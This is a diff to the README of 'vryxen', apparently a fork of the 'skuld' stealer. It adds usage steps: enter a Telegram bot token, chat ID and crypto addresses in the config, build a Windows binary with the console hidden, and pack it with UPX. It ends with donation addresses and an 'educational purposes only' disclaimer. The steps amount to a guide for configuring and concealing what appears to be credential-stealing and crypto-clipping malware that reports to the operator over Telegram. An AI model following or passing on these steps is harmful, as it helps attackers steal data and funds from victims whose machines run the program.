@@ -51,3 +51,80 @@ git clone https://github.com/unf6/vryxen
 ```bash
 cd vryxen
 ```
+## Usage
+
+You can use the Project template:
+
+- Open `cmd/main.go` and edit config with your Telegram Bot Token, Your Chat Id, and your crypto addresses
+
+- Build the template: (reduce binary size by using `-s -w`)
+
+```bash
+go build -ldflags "-s -w"
+```
+
+- You can hide the console without `hideconsole` module (you must remove `common.IsAlreadyRunning()` check from `cmd/main.go` before) by running
+
+```bash
+go build -ldflags "-s -w -H=windowsgui"
+```
+
+- You can also optionally pack the output executable with UPX which will reduce the binary size from ~10MB to ~3MB. To do this, install [UPX](https://github.com/upx/upx/releases/) and run
+
+```bash
+upx.exe --ultra-brute vryxen.exe
+```
+
+- You can also use vryxen in your own Go code. Just import the desired module like this:
+```go
+package main
+
+import "github.com/unf6/vryxen/internal/hc"
+
+func main() {
+  HideConsole.Hide()
+}
+```
+
+## Contributing
+Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Make sure to follow the [Contributing Guidelines](https://github.com/unf6/vryxen/blob/main/CONTRIBUTING.md)
+
+You can also support this project development by leaving a star ⭐ or by donating me. Every little tip helps!
+
+BTC: bc1qlhqlc4fy3wd98m8qmv05zu059j6am9jh4kj4v2
+
+## License
+This library is released under the MIT License. See LICENSE file for more informations.
+
+
+## Contact
+If you have any questions or need further assistance, please contact [@xretic:matrix.org
+](https://matrix.to/#/@xretic:matrix.org)
+
+
+## Acknowledgments
+[Orginal Author](https://github.com/hackirby)
+
+<br>
+
+## Disclaimer
+
+### Important Notice: This tool is intended for educational purposes only.
+
+This software, referred to as skuld, is provided strictly for educational and research purposes. Under no circumstances should this tool be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.
+
+### Usage Responsibility:
+
+By accessing and using this tool, you acknowledge that you are solely responsible for your actions. Any misuse of this software is strictly prohibited, and the creator (xretic) disclaims any responsibility for how this tool is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.
+
+### No Liability:
+
+The creator (xretic) of this tool shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use the tool.
+
+### No Support:
+
+The creator (xretic) will not provide any support, guidance, or assistance related to the misuse of this tool. Any inquiries regarding malicious activities will be ignored.
+
+### Acceptance of Terms:
+
+By using this tool, you signify your acceptance of this disclaimer. If you do not agree with the terms stated in this disclaimer, do not use the software.
